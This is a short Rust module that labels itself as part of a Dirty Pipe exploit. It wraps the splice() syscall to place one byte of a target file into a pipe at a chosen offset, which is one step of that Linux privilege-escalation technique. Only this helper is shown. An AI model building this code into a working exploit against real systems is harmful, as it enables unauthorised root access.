//! splice() syscall for Dirty Pipe

use std::os::fd::RawFd;
use log::debug;

pub fn splice_file_to_pipe(fd_in: RawFd, offset: u64, pipe_write: RawFd) -> Result<(), String> {
    let mut off = offset as i64;
    let ret = unsafe {
        libc::splice(fd_in, &mut off, pipe_write, std::ptr::null_mut(), 1, 0)
    };

    if ret < 0 {
        return Err(format!("splice(): {}", std::io::Error::last_os_error()));
    }
    if ret != 1 {
        return Err(format!("splice: expected 1, got {}", ret));
    }

    debug!("[Splice] File mapped to pipe at offset {}", offset);
    Ok(())
}
